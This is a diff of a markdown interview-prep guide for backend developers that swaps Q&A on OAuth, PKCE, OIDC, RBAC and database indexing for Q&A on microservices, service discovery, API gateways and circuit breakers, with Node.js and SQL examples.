-   }
-
-6. Google returns tokens:
-   {
-     access_token:  "ya29.A0ARrdaM...",
-     refresh_token: "1//0gLcP...",
-     id_token:      "eyJhbGci...",  ← JWT with user info (OpenID Connect)
-     expires_in:    3600
-   }
-
-7. Your app uses access_token to call Google APIs:
-   GET https://www.googleapis.com/userinfo/v2/me
-   Authorization: Bearer ya29.A0ARrdaM...
-   → { id: "123", email: "alice@gmail.com", name: "Alice" }
-
-8. Create/find user in your DB, issue your own session/JWT
-```
-
-**Node.js implementation:**
-
-```js
-const { google } = require('googleapis');
-
-const oauth2Client = new google.auth.OAuth2(
-  process.env.GOOGLE_CLIENT_ID,
-  process.env.GOOGLE_CLIENT_SECRET,
-  'https://yourapp.com/auth/google/callback'
-);
-
-// Step 2: Redirect to Google
-app.get('/auth/google', (req, res) => {
-  const state = crypto.randomBytes(16).toString('hex');
-  req.session.oauthState = state;
-
-  const url = oauth2Client.generateAuthUrl({
-    access_type: 'offline',
-    scope: ['openid', 'email', 'profile'],
-    state
-  });
-  res.redirect(url);
-});
-
-// Step 4-8: Handle callback
-app.get('/auth/google/callback', async (req, res) => {
-  const { code, state } = req.query;
-
-  // Validate state (CSRF protection)
-  if (state !== req.session.oauthState) {
-    return res.status(400).json({ error: 'Invalid state — possible CSRF attack' });
-  }
-
-  // Exchange code for tokens
-  const { tokens } = await oauth2Client.getToken(code);
-  oauth2Client.setCredentials(tokens);
-
-  // Get user info
-  const oauth2 = google.oauth2({ version: 'v2', auth: oauth2Client });
-  const { data: googleUser } = await oauth2.userinfo.get();
-
-  // Find or create user in your DB
-  let user = await User.findByEmail(googleUser.email);
-  if (!user) {
-    user = await User.create({
-      email:    googleUser.email,
-      name:     googleUser.name,
-      googleId: googleUser.id,
-      avatarUrl: googleUser.picture
-    });
-  }
-
-  // Issue your own JWT
-  const jwt = signJwt({ userId: user.id, role: user.role });
-  res.cookie('accessToken', jwt, { httpOnly: true, secure: true });
-  res.redirect('/dashboard');
-});
-```
-
-> 📖 Reference: [Authorization Code Flow — Auth0](https://auth0.com/docs/get-started/authentication-and-authorization-flow/authorization-code-flow)
-
----
-
-**Q14. What is PKCE (Proof Key for Code Exchange)? Why was it introduced?**
-
-**Answer:**
-
-PKCE (pronounced "pixy") is an extension to the Authorization Code Flow that prevents **authorization code interception attacks** in public clients (mobile apps, SPAs) that can't securely store a `client_secret`.
-
-**The attack PKCE prevents:**
-
-```
-Normal Auth Code Flow (no PKCE):
-1. App requests code → Google returns code via redirect
-2. ❌ Malicious app on the same device intercepts the redirect URL and steals the code
-3. Attacker exchanges code for tokens using the stolen authorization code
-```
-
-**How PKCE works:**
-
-```
-1. App generates a random code_verifier: "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
-
-2. App creates code_challenge = BASE64URL(SHA256(code_verifier)):
-   "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"
-
-3. App sends code_challenge (NOT the verifier) with the auth request:
-   GET /auth
-   ?code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM
-   &code_challenge_method=S256
-   &...
-
-4. Auth server stores the challenge
-
-5. Even if attacker intercepts the code, they DON'T have code_verifier
-   → They can't exchange the code for tokens ✅
-
-6. Legitimate app exchanges code WITH the verifier:
-   POST /token
-   {
-     code:          "stolen_code",
-     code_verifier: "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
-   }
-   Auth server: SHA256(code_verifier) == stored code_challenge? ✅ → grant tokens
-```
-
-**Node.js implementation:**
-
-```js
-const crypto = require('crypto');
-
-// Generate PKCE pair
-function generatePKCE() {
-  const verifier = crypto.randomBytes(32).toString('base64url');
-  const challenge = crypto
-    .createHash('sha256')
-    .update(verifier)
-    .digest('base64url');
-  return { verifier, challenge };
-}
-
-// In the browser/client
-const { verifier, challenge } = generatePKCE();
-sessionStorage.setItem('pkce_verifier', verifier); // store verifier
-
-const authUrl = `https://auth.server.com/auth
-  ?client_id=${CLIENT_ID}
-  &redirect_uri=${REDIRECT_URI}
-  &response_type=code
-  &code_challenge=${challenge}
-  &code_challenge_method=S256`;
-
-window.location.href = authUrl;
-
-// On callback:
-const verifier = sessionStorage.getItem('pkce_verifier');
-const response = await fetch('/auth/token', {
-  method: 'POST',
-  body: JSON.stringify({ code, code_verifier: verifier })
-});
-```
-
-> 📖 Reference: [PKCE — Auth0](https://auth0.com/docs/get-started/authentication-and-authorization-flow/authorization-code-flow-with-pkce)
-
----
-
-**Q15. What is OpenID Connect (OIDC)? How does it differ from OAuth 2.0?**
-
-**Answer:**
-
-| | OAuth 2.0 | OpenID Connect (OIDC) |
-|--|-----------|----------------------|
-| Purpose | **Authorization** — grant access to resources | **Authentication** — verify WHO the user is |
-| Answers | "Can this app access these resources?" | "Who is this user?" |
-| Returns | Access token | Access token + **ID token (JWT with user info)** |
-| User info | Not specified | Standardized `/userinfo` endpoint + `id_token` |
-| Built on | Protocol spec | Built ON TOP of OAuth 2.0 |
-
-**Analogy:**
-- OAuth 2.0 = Hotel key card (gives access to a room, but doesn't prove who you are)
-- OIDC = Passport (proves your identity)
-
-**ID Token example (OIDC-specific):**
-
-```json
-// JWT decoded:
-{
-  "iss": "https://accounts.google.com",  // issuer
-  "sub": "110169484474386276334",         // unique user ID (stable)
-  "aud": "your-client-id",               // your app
-  "exp": 1716003600,
-  "iat": 1716000000,
-  "email": "alice@gmail.com",
-  "email_verified": true,
-  "name": "Alice Smith",
-  "picture": "https://lh3.googleusercontent.com/...",
-  "given_name": "Alice",
-  "family_name": "Smith",
-  "locale": "en"
-}
-// This is authentication — you know WHO the user is, verified by Google
-```
-
-```js
-// OIDC: verify ID token and extract user identity
-const { OAuth2Client } = require('google-auth-library');
-const googleClient = new OAuth2Client(process.env.GOOGLE_CLIENT_ID);
-
-app.post('/auth/google/verify', async (req, res) => {
-  const { idToken } = req.body;
-
-  // Verify the ID token (signature, expiry, audience)
-  const ticket = await googleClient.verifyIdToken({
-    idToken,
-    audience: process.env.GOOGLE_CLIENT_ID
-  });
-
-  const payload = ticket.getPayload();
-  // payload.sub = stable unique Google user ID
-  // payload.email = alice@gmail.com
-  // payload.email_verified = true
-  // payload.name = "Alice Smith"
-
-  const user = await User.findOrCreate({ googleId: payload.sub, email: payload.email });
-  const jwt = signAppJwt({ userId: user.id });
-  res.json({ token: jwt });
-});
-```
-
-> 📖 Reference: [OIDC vs OAuth — Okta](https://developer.okta.com/blog/2019/10/21/illustrated-guide-to-oauth-and-oidc)
-
----
-
-**Q16. What is role-based access control (RBAC)? How would you implement it in a REST API?**
-
-**Answer:**
-
-**RBAC** assigns permissions to roles rather than individual users. Users are assigned roles, and roles have permissions.
-
-```
-Users → Roles → Permissions
-
-alice  → admin  → can: read_users, write_users, delete_users, read_orders, write_orders
-bob    → editor → can: read_users, write_orders
-carol  → viewer → can: read_users, read_orders
-```
-
-**Full implementation:**
-
-```js
-// ── Database schema ──────────────────────────────────────────────────
-// users:       id, name, email, role_id
-// roles:       id, name (admin, editor, viewer)
-// permissions: id, name (read_users, write_users, delete_users, ...)
-// role_permissions: role_id, permission_id
-
-// ── Embed role + permissions in JWT at login ─────────────────────────
-app.post('/login', async (req, res) => {
-  const user = await validateCredentials(req.body);
-  const role = await getRoleWithPermissions(user.role_id);
-  // role = { name: 'admin', permissions: ['read_users', 'write_users', 'delete_users'] }
-
-  const token = jwt.sign(
-    {
-      userId: user.id,
-      role:   role.name,
-      permissions: role.permissions
-    },
-    process.env.JWT_SECRET,
-    { expiresIn: '15m' }
-  );
-  res.json({ token });
-});
-
-// ── RBAC middleware factory ──────────────────────────────────────────
-const requirePermission = (permission) => (req, res, next) => {
-  const { permissions } = req.user; // set by auth middleware
-  if (!permissions.includes(permission)) {
-    return res.status(403).json({
-      error: 'Forbidden',
-      required: permission,
-      message: `You need '${permission}' permission to access this resource`
-    });
-  }
-  next();
-};
-
-const requireRole = (...roles) => (req, res, next) => {
-  if (!roles.includes(req.user.role)) {
-    return res.status(403).json({ error: 'Forbidden', required: roles });
-  }
-  next();
-};
-
-// ── Apply to routes ──────────────────────────────────────────────────
-// Anyone authenticated
-app.get('/profile',         requireAuth, getProfile);
-
-// Only admins
-app.get('/admin/users',     requireAuth, requireRole('admin'), listAllUsers);
-
-// Permission-based (more flexible than role-based)
-app.get('/users',           requireAuth, requirePermission('read_users'),   listUsers);
-app.post('/users',          requireAuth, requirePermission('write_users'),  createUser);
-app.delete('/users/:id',    requireAuth, requirePermission('delete_users'), deleteUser);
-app.get('/orders',          requireAuth, requirePermission('read_orders'),  listOrders);
-
-// ── Usage example ────────────────────────────────────────────────────
-// alice (admin) → GET /users → 200 OK ✅
-// carol (viewer) → DELETE /users/5 → 403 Forbidden ✅
-
-// ── Resource-level RBAC (can only edit own resources) ────────────────
-app.patch('/posts/:id', requireAuth, async (req, res) => {
-  const post = await Post.findById(req.params.id);
-
-  const canEdit = req.user.role === 'admin'
-    || post.authorId === req.user.userId;   // owner can always edit their own
-
-  if (!canEdit) {
-    return res.status(403).json({ error: 'You can only edit your own posts' });
-  }
-
-  const updated = await Post.update(req.params.id, req.body);
-  res.json(updated);
-});
-```
-
-> 📖 Reference: [RBAC — Auth0](https://auth0.com/docs/manage-users/access-control/rbac)
-
----
-
-## 3. Database Indexing & Query Optimization
-
----
-
-**Q17. What is a composite index? When should you use one vs a single-column index?**
-
-**Answer:**
-
-A **composite index** (multi-column index) indexes two or more columns together as a single index entry.
-
-```sql
--- Single-column indexes (separate)
-CREATE INDEX idx_users_email  ON users(email);
-CREATE INDEX idx_users_status ON users(status);
-
--- Composite index (together)
-CREATE INDEX idx_users_status_email ON users(status, email);
-```
-
-**The Left-Prefix Rule:** A composite index on `(status, email)` can be used for:
-- Queries on `status` alone ✅
-- Queries on `status` AND `email` together ✅
-- Queries on `email` alone ❌ (right-side column without left-side can't use the index)
-
-```sql
--- Composite index: (status, email, created_at)
-
--- ✅ Uses index
-SELECT * FROM users WHERE status = 'active';
-SELECT * FROM users WHERE status = 'active' AND email = 'a@b.com';
-SELECT * FROM users WHERE status = 'active' AND email = 'a@b.com' AND created_at > '2024-01-01';
-
--- ❌ Cannot use composite index (skips leftmost column)
-SELECT * FROM users WHERE email = 'a@b.com';
-SELECT * FROM users WHERE created_at > '2024-01-01';
-```
-
-**Real-world decision guide:**
-
-```sql
--- Use SINGLE index when queries only filter by one column
-SELECT * FROM users WHERE email = ?;
-→ CREATE INDEX idx_email ON users(email);
-
--- Use COMPOSITE index when you frequently query by multiple columns together
--- AND the combination has better selectivity
-SELECT * FROM orders WHERE user_id = ? AND status = ? ORDER BY created_at DESC;
-→ CREATE INDEX idx_orders_user_status_date ON orders(user_id, status, created_at);
--- Order matters: put = conditions first, range conditions last
-
--- Rule of thumb: order columns by selectivity (most selective first)
--- AND by how they appear in your most common WHERE clauses
-```
-
-> 📖 Reference: [Composite Indexes — Use The Index Luke](https://use-the-index-luke.com/sql/where-clause/the-equals-operator/concatenated-keys)
-
----
-
-**Q18. What is a covering index? How can it eliminate table lookups?**
-
-**Answer:**
-
-A **covering index** is an index that contains all the columns a query needs — so the database can satisfy the entire query from the index alone, without ever touching the main table (heap).
-
-```sql
--- Table: orders(id, user_id, status, total, created_at, shipping_address, notes, ...)
-
--- ❌ Non-covering: index has user_id, but query also needs status and total
-CREATE INDEX idx_orders_user ON orders(user_id);
-
-EXPLAIN SELECT user_id, status, total
-FROM orders WHERE user_id = 42;
--- Plan: Index Scan → for each matching row, go back to heap to get status and total
--- Extra: "Using index condition" ← heap lookups happening
-
--- ✅ Covering index: includes ALL columns the query needs
-CREATE INDEX idx_orders_covering ON orders(user_id, status, total);
-
-EXPLAIN SELECT user_id, status, total
-FROM orders WHERE user_id = 42;
--- Plan: Index Only Scan
--- Extra: "Using index" ← no heap lookup needed! ✅
--- Much faster for read-heavy workloads
-```
-
-**PostgreSQL example:**
-
-```sql
--- Query: list all active orders for a user with just the essential fields
-SELECT id, status, total, created_at
-FROM orders
-WHERE user_id = 42 AND status = 'active'
-ORDER BY created_at DESC;
-
--- Covering index for this query:
-CREATE INDEX idx_orders_user_status_covering
-ON orders(user_id, status, created_at DESC)
-INCLUDE (id, total);  -- INCLUDE = store extra columns but don't sort by them (PostgreSQL 11+)
-
--- Now EXPLAIN shows: Index Only Scan ← reads index only, no table access
-```
-
-**Trade-off:** Covering indexes are larger and slower to write (since more data is in the index). Only add them for queries that are demonstrably slow and run very frequently.
-
-> 📖 Reference: [Covering Index — Use The Index Luke](https://use-the-index-luke.com/sql/clustering/index-only-scan-covering-index)
-
----
-
-**Q19. What is a full-text search index? How is it different from a LIKE query?**
-
-**Answer:**
-
-| | `LIKE '%keyword%'` | Full-Text Search |
-|--|-------------------|-----------------|
-| Index used | ❌ No (leading wildcard defeats index) | ✅ Yes (inverted index) |
-| Performance | O(n) — full table scan | O(log n) — index lookup |
-| Relevance ranking | ❌ No | ✅ Yes (TF-IDF ranking) |
-| Stemming | ❌ No ("run" ≠ "running") | ✅ Yes |
-| Stop words | ❌ No | ✅ Yes ("the", "is" ignored) |
-| Typo tolerance | ❌ No | Sometimes (with fuzzy search) |
-
-**PostgreSQL full-text search example:**
-
-```sql
--- Setup
-ALTER TABLE articles ADD COLUMN search_vector tsvector;
-
--- Generate search vector (tokenized, stemmed, weighted)
-UPDATE articles
-SET search_vector = to_tsvector('english', title || ' ' || body);
-
--- Create GIN index for fast full-text lookups
-CREATE INDEX idx_articles_fts ON articles USING GIN(search_vector);
-
--- Triggered update on insert/update
-CREATE TRIGGER update_search_vector
-BEFORE INSERT OR UPDATE ON articles
-FOR EACH ROW EXECUTE FUNCTION
-  tsvector_update_trigger(search_vector, 'pg_catalog.english', title, body);
-
--- Query: search for articles about "database performance"
-SELECT id, title,
-  ts_rank(search_vector, query) AS rank  -- relevance score
-FROM articles, to_tsquery('english', 'database & performance') query
-WHERE search_vector @@ query
-ORDER BY rank DESC
-LIMIT 10;
-
--- ✅ "database performance" matches:
---   "Improving Database Performance" (stemmed: databas, perform)
---   "Performance tuning for databases" ← stemming handles "databases" → "databas"
-
--- ❌ LIKE equivalent (don't use for text search):
-SELECT * FROM articles WHERE body LIKE '%database performance%';
--- Full table scan, no ranking, misses "databases", "performing"
-```
-
-**When to use Elasticsearch instead of DB full-text search:**
-- Very large datasets (millions of articles).
-- Complex search features (facets, autocomplete, typo tolerance).
-- Full-text search is the core feature, not secondary.
-
-> 📖 Reference: [Full-Text Search — PostgreSQL Docs](https://www.postgresql.org/docs/current/textsearch.html)
-
----
-
-**Q20. What is query caching at the database level? How is it different from application-level caching?**
-
-**Answer:**
-
-**DB-level query cache** (e.g., MySQL query cache): The DB engine caches the exact result of a SQL query string. If the exact same query is run again and the underlying tables haven't changed, it returns the cached result.
-
-**Application-level caching** (Redis/Memcached): Your code explicitly stores and retrieves query results in an external cache.
-
-```
-DB-level caching:
-App → SQL query → DB checks cache → HIT: return cached result
-                                  → MISS: execute query → cache result → return
-
-Application-level caching:
-App → check Redis → HIT: return cached data (no DB involved)
-                  → MISS → run SQL → store in Redis → return
+Monolith:
+┌────────────────────────────────────────────────────────┐
+│  UserModule  │  OrderModule  │  PaymentModule  │  NotifyModule  │
+│                  Single Process, Single Deploy                   │
+│                  Single Database                                 │
+└────────────────────────────────────────────────────────┘
+
+Microservices:
+┌────────────┐  ┌────────────┐  ┌─────────────┐  ┌──────────────┐
+│  User Svc  │  │  Order Svc │  │ Payment Svc │  │  Notify Svc  │
+│  :3001     │  │  :3002     │  │  :3003      │  │  :3004       │
+│  users DB  │  │  orders DB │  │payments DB  │  │ notify DB    │
+└────────────┘  └────────────┘  └─────────────┘  └──────────────┘
+  (Node.js)       (Go)           (Java)             (Python)
 ```
 
 **Key differences:**
 
-| | DB Query Cache | Application-Level Cache (Redis) |
-|--|--------------|-------------------------------|
-| Transparency | Automatic — DB handles it | Manual — developer writes cache logic |
-| Granularity | Per exact SQL string | Per business object / any key |
-| Flexibility | None | Full control (TTL, invalidation, data transformation) |
-| Cross-service | No | Yes — all microservices can share Redis |
-| Status | MySQL 8.0 removed it! | Actively used everywhere |
-| Recommended? | ❌ No longer | ✅ Yes |
+| | Monolith | Microservices |
+|--|----------|--------------|
+| Deployment | All-or-nothing | Per-service, independent |
+| Scaling | Scale entire app | Scale only bottleneck service |
+| Tech stack | One language/framework | Polyglot per service |
+| Team structure | One big team | Small teams own each service |
+| Failure isolation | One bug can crash everything | Failure isolated to one service |
+| Complexity | Simple initially | High operational complexity |
+| Data | Single shared DB | DB per service |
+| Testing | Easier (everything local) | Integration testing is harder |
 
-**Why MySQL removed its query cache:**
-- It was a global lock bottleneck at scale.
-- Invalidated entirely when ANY row in the table changes (too aggressive).
-- Application-level caching (Redis) is far more effective and flexible.
-
-```js
-// ✅ Application-level cache — what you should actually use
-async function getProductsByCategory(categoryId) {
-  const cacheKey = `products:category:${categoryId}`;
-
-  const cached = await redis.get(cacheKey);
-  if (cached) return JSON.parse(cached);
-
-  const products = await db.query(
-    'SELECT * FROM products WHERE category_id = ? AND active = 1',
-    [categoryId]
-  );
-
-  await redis.setex(cacheKey, 300, JSON.stringify(products));
-  return products;
-}
-```
-
-> 📖 Reference: [DB Query Cache — MySQL Docs](https://dev.mysql.com/doc/refman/8.0/en/query-cache.html)
+> 📖 Reference: [Microservices — Martin Fowler](https://martinfowler.com/articles/microservices.html)
 
 ---
 
-**Q21. What is a database deadlock at the query level? How do you detect and resolve it?**
+**Q2. What are the key benefits and drawbacks of microservices?**
 
 **Answer:**
 
-A **deadlock** at the database level occurs when two transactions each hold a lock the other needs, creating a circular wait. The DB detects this and kills one transaction (the "victim").
+**Benefits:**
 
 ```
-Transaction A:                  Transaction B:
-LOCK ROW orders#1              LOCK ROW orders#2
-... (doing work) ...            ... (doing work) ...
-WAIT for orders#2 ←←←←←←←→→→→ WAIT for orders#1
-       ↑                               ↓
-       └──────── DEADLOCK ─────────────┘
+1. Independent deployability
+   → Team A deploys Order Service 10 times/day without waiting for Team B
+   → Smaller deploys = smaller blast radius
 
-DB kills one transaction → it receives: ERROR: deadlock detected
+2. Independent scalability
+   → Only the Order Service is under load during Black Friday?
+   → Scale just Order Service from 3 pods to 50 pods
+   → Don't waste money scaling the rarely-used Notification Service
+
+3. Technology heterogeneity
+   → Use Go for the high-throughput Image Service
+   → Use Python for the ML Recommendation Service
+   → Use Node.js for the real-time Chat Service
+   → Best tool for each job
+
+4. Fault isolation
+   → Notification Service crashes → Orders still work
+   → Monolith: one bug in notifications crashes everything
+
+5. Team autonomy
+   → Each team owns a service end-to-end: design, build, deploy, on-call
+   → Faster delivery, less coordination overhead
 ```
 
-**Real example:**
-
-```sql
--- Transaction A: Transfer from account 1 to account 2
-BEGIN;
-UPDATE accounts SET balance = balance - 100 WHERE id = 1; -- locks row 1
-UPDATE accounts SET balance = balance + 100 WHERE id = 2; -- waits for row 2
-
--- Transaction B: Transfer from account 2 to account 1 (simultaneous)
-BEGIN;
-UPDATE accounts SET balance = balance - 50 WHERE id = 2;  -- locks row 2
-UPDATE accounts SET balance = balance + 50 WHERE id = 1;  -- waits for row 1 → DEADLOCK
-```
-
-**Detection:**
-
-```sql
--- PostgreSQL: view current locks
-SELECT pid, query, wait_event_type, wait_event, state
-FROM pg_stat_activity
-WHERE wait_event_type = 'Lock';
-
--- Enable deadlock logging
--- postgresql.conf:
-log_lock_waits = on
-deadlock_timeout = 1s
-```
-
-**Resolution strategies:**
+**Drawbacks:**
 
 ```js
-// ── Fix 1: Consistent lock ordering (best prevention) ────────────────
-// Always lock accounts in the same order (smaller ID first)
-async function transferMoney(fromId, toId, amount) {
-  const [firstId, secondId] = fromId < toId
-    ? [fromId, toId]
-    : [toId, fromId];
+// 1. Network overhead and latency
+// Monolith: function call = nanoseconds
+getUserOrders(userId); // in-process call
 
-  await db.query('BEGIN');
-  await db.query('SELECT * FROM accounts WHERE id = ? FOR UPDATE', [firstId]);
-  await db.query('SELECT * FROM accounts WHERE id = ? FOR UPDATE', [secondId]);
+// Microservices: HTTP/gRPC call = milliseconds + failure risk
+const orders = await fetch('http://order-service/users/${userId}/orders');
+// Network can fail, timeout, be slow
 
-  await db.query('UPDATE accounts SET balance = balance - ? WHERE id = ?', [amount, fromId]);
-  await db.query('UPDATE accounts SET balance = balance + ? WHERE id = ?', [amount, toId]);
-  await db.query('COMMIT');
+// 2. Distributed data management (no joins across services!)
+// ❌ Can't do this in microservices:
+SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id;
+// Users are in User Service DB, Orders in Order Service DB
+
+// ✅ Must aggregate in application code (slower, more complex):
+const user  = await userService.getUser(userId);
+const orders = await orderService.getOrdersByUser(userId);
+const result = { ...user, orders };
+
+// 3. Distributed tracing complexity
+// A single user request spans 5 services — which one caused the bug?
+// Need: correlation IDs, distributed tracing (Jaeger, Zipkin)
+
+// 4. Operational overhead
+// 1 monolith → 1 deployment, 1 log stream, 1 metric dashboard
+// 20 microservices → 20 deployments, 20 log streams, 20 dashboards
+// Need: service mesh, centralized logging, distributed tracing, API gateway
+
+// 5. Testing complexity
+// Unit tests: easy
+// Integration tests: need all 5 services running locally → Docker Compose hell
+// Contract tests: need Pact or similar framework
+
+// 6. "Microservices tax" — overhead before you write business code:
+// - Set up service template (Dockerfile, CI/CD, health check, logging, tracing)
+// - Configure service discovery
+// - Set up API gateway route
+// - Configure authentication
+// → New monolith feature: days. New microservice: weeks.
+```
+
+> 📖 Reference: [Microservices Trade-offs — Martin Fowler](https://martinfowler.com/articles/microservice-trade-offs.html)
+
+---
+
+**Q3. What is service discovery? What is the difference between client-side and server-side discovery?**
+
+**Answer:**
+
+In microservices, service instances start and stop dynamically (scaling, failures, deployments). **Service discovery** lets services find each other's current network addresses without hardcoding IPs.
+
+**Client-Side Discovery:**
+The client queries a service registry directly, gets the list of available instances, and picks one using a load-balancing algorithm.
+
+```
+Client → Service Registry (Consul/Eureka) → "Order Service is at 10.0.1.5:3002"
+Client → Directly calls 10.0.1.5:3002
+```
+
+```js
+// Client-side discovery with Consul
+const consul = require('consul')();
+
+async function getOrderServiceUrl() {
+  const services = await consul.health.service({
+    service: 'order-service',
+    passing: true   // only healthy instances
+  });
+
+  // Client picks one (round-robin, random, least-connections)
+  const instance = services[Math.floor(Math.random() * services.length)];
+  return `http://${instance.Service.Address}:${instance.Service.Port}`;
 }
-// Both transactions always lock the smaller ID first → no circular wait
 
-// ── Fix 2: Retry on deadlock ──────────────────────────────────────────
-async function withRetry(fn, maxRetries = 3) {
-  for (let attempt = 1; attempt <= maxRetries; attempt++) {
-    try {
-      return await fn();
-    } catch (err) {
-      if (err.code === '40P01' && attempt < maxRetries) { // PostgreSQL deadlock code
-        const backoff = Math.pow(2, attempt) * 10; // 20ms, 40ms, 80ms
-        await new Promise(r => setTimeout(r, backoff));
-        continue;
+// Register this service on startup
+await consul.agent.service.register({
+  name: 'user-service',
+  address: process.env.POD_IP,
+  port: 3001,
+  check: { http: 'http://localhost:3001/health', interval: '10s' }
+});
+```
+
+**Server-Side Discovery:**
+The client sends the request to a load balancer (or API gateway). The load balancer queries the registry and forwards to the right instance. Client is oblivious.
+
+```
+Client → Load Balancer/API Gateway → Service Registry
+                                    → "Order Service" → 10.0.1.5:3002
+                                    → Forwards request
+```
+
+```
+# Kubernetes uses server-side discovery natively:
+# Service DNS: order-service.default.svc.cluster.local
+# kube-proxy handles routing to the correct pod
+
+# Client just calls:
+fetch('http://order-service/orders')
+# Kubernetes resolves → routes to a healthy pod automatically
+```
+
+| | Client-Side | Server-Side |
+|--|------------|------------|
+| Discovery logic | In the client | In the load balancer |
+| Client complexity | High (registry SDK needed) | Low (just call LB URL) |
+| Language support | Must implement per language | Language-agnostic |
+| Examples | Netflix Eureka + Ribbon | AWS ALB, Kubernetes Services, NGINX |
+
+> 📖 Reference: [Service Discovery — NGINX](https://www.nginx.com/blog/service-discovery-in-a-microservices-architecture/)
+
+---
+
+**Q4. What is an API gateway? What responsibilities does it typically handle?**
+
+**Answer:**
+
+An **API gateway** is the single entry point for all client traffic to your microservices. Instead of clients knowing about dozens of internal services, they talk only to the gateway.
+
+```
+Clients → API Gateway → User Service
+                     → Order Service
+                     → Payment Service
+                     → Product Service
+```
+
+**Responsibilities:**
+
+```js
+// A real API gateway (Express + custom middleware) handles:
+
+// 1. Request routing — forward to the right service
+app.use('/api/users',    proxy('http://user-service:3001'));
+app.use('/api/orders',   proxy('http://order-service:3002'));
+app.use('/api/payments', proxy('http://payment-service:3003'));
+
+// 2. Authentication — verify JWT before any service sees the request
+app.use(async (req, res, next) => {
+  const token = req.headers.authorization?.split(' ')[1];
+  if (!token) return res.status(401).json({ error: 'Unauthorized' });
+  try {
+    req.user = jwt.verify(token, process.env.JWT_SECRET);
+    next();
+  } catch { res.status(401).json({ error: 'Invalid token' }); }
+});
+// Services don't need to implement auth — gateway handles it ✅
+
+// 3. Rate limiting
+app.use(rateLimit({ windowMs: 60000, max: 100 }));
+
+// 4. Request/response transformation
+app.use('/api/v2/orders', (req, res, next) => {
+  // Transform v2 request format to v1 that the service understands
+  req.body = transformV2ToV1(req.body);
+  next();
+});
+
+// 5. SSL termination (handle HTTPS at gateway, forward HTTP internally)
+
+// 6. Logging & correlation IDs
+app.use((req, res, next) => {
+  req.correlationId = req.headers['x-correlation-id'] || crypto.randomUUID();
+  res.setHeader('X-Correlation-ID', req.correlationId);
+  logger.info('Request', { method: req.method, path: req.path, correlationId: req.correlationId });
+  next();
+});
+
+// 7. Load balancing between service instances
+
+// 8. Circuit breaking — stop sending to unhealthy services
+
+// Popular gateways: Kong, AWS API Gateway, NGINX, Traefik, Envoy
+```
+
+> 📖 Reference: [API Gateway Pattern — Microsoft](https://learn.microsoft.com/en-us/azure/architecture/microservices/design/gateway)
+
+---
+
+**Q5. How do microservices communicate? What is the difference between synchronous and asynchronous inter-service communication?**
+
+**Answer:**
+
+**Synchronous (request/response):** Caller waits for the response before continuing.
+
+```js
+// HTTP/REST — simple, widely used
+const response = await fetch('http://order-service/orders/42');
+const order = await response.json();
+// Caller WAITS here — if order-service is slow, caller is slow too
+
+// gRPC — binary, typed, faster for internal services
+const order = await orderServiceClient.getOrder({ id: '42' });
+// Still synchronous — caller waits
+
+// Problem: Cascading failures
+// If Order Service calls Payment Service calls Fraud Service:
+// Fraud Service slow → Payment Service slow → Order Service slow → User sees slowness
+// Solution: Circuit breaker, timeouts
+```
+
+**Asynchronous (event/message-based):** Caller sends a message and continues without waiting.
+
+```js
+// Kafka / RabbitMQ — fire and forget
+await kafka.producer().send({
+  topic: 'order-events',
+  messages: [{ value: JSON.stringify({ type: 'ORDER_PLACED', orderId: 42 }) }]
+});
+// Caller continues immediately — doesn't wait for consumers to process ✅
+
+// Benefits:
+// - Decoupling: Order Service doesn't need to know about Notification Service
+// - Resilience: Notification Service down? Messages queue up, processed when it recovers
+// - Scalability: Consumers scale independently
+
+// Drawbacks:
+// - Eventual consistency: effects happen "later", not immediately
+// - Harder to debug: no synchronous call stack
+// - Requires message broker infrastructure
+```
+
+**Decision guide:**
+
+| Use Synchronous when | Use Asynchronous when |
+|---------------------|----------------------|
+| Response needed immediately (user is waiting) | Work can happen later (background processing) |
+| Query for data | Notify other services of events |
+| Simple request-response | Fan-out to multiple consumers |
+| Read operations | Long-running operations |
+| Example: "Get user profile" | Example: "User signed up → send email + update analytics + assign trial" |
+
+> 📖 Reference: [Microservice Communication — Microsoft Docs](https://learn.microsoft.com/en-us/dotnet/architecture/microservices/architect-microservice-container-applications/communication-in-microservice-architecture)
+
+---
+
+**Q6. What is the Circuit Breaker pattern? How does it prevent cascading failures?**
+
+**Answer:**
+
+The **Circuit Breaker** wraps calls to a failing service. After a threshold of failures, it "opens" (stops sending requests) for a cooldown period, then "half-opens" to test recovery.
+
+**Three states:**
+
+```
+CLOSED (normal):     Requests pass through normally, failures counted
+OPEN (tripped):      Requests immediately fail-fast (no network call made)
+                     Protects downstream service from more load
+HALF-OPEN (testing): Let a few requests through to test if service recovered
+                     Success → CLOSED, Failure → OPEN again
+```
+
+**Real implementation:**
+
+```js
+class CircuitBreaker {
+  constructor(fn, options = {}) {
+    this.fn = fn;
+    this.failureThreshold  = options.failureThreshold  || 5;   // open after 5 failures
+    this.successThreshold  = options.successThreshold  || 2;   // close after 2 successes
+    this.timeout           = options.timeout           || 10000; // 10s cooldown
+    this.state             = 'CLOSED';
+    this.failureCount      = 0;
+    this.successCount      = 0;
+    this.nextAttempt       = Date.now();
+  }
+
+  async call(...args) {
+    if (this.state === 'OPEN') {
+      if (Date.now() < this.nextAttempt) {
+        // Fail immediately — don't even try
+        throw new Error(`Circuit OPEN — service unavailable. Retry after ${new Date(this.nextAttempt).toISOString()}`);
       }
+      // Cooldown elapsed → try half-open
+      this.state = 'HALF_OPEN';
+      console.log('Circuit HALF-OPEN — testing service recovery');
+    }
+
+    try {
+      const result = await this.fn(...args);
+      this.onSuccess();
+      return result;
+    } catch (err) {
+      this.onFailure();
       throw err;
     }
   }
-}
 
-await withRetry(() => transferMoney(1, 2, 100));
-```
-
-> 📖 Reference: [Deadlocks — PostgreSQL Docs](https://www.postgresql.org/docs/current/explicit-locking.html#LOCKING-DEADLOCKS)
-
----
-
-**Q22. What is the difference between a clustered index and a non-clustered index?**
-
-**Answer:**
-
-| | Clustered Index | Non-Clustered Index |
-|--|----------------|---------------------|
-| Data storage | Index IS the table — rows physically ordered by index key | Separate structure — points to the actual row |
-| Count per table | Max 1 (it defines physical order) | Many (limited by DB, typically ~999) |
-| Read performance | Fast for range scans (rows are adjacent on disk) | Requires "bookmark lookup" to fetch actual row |
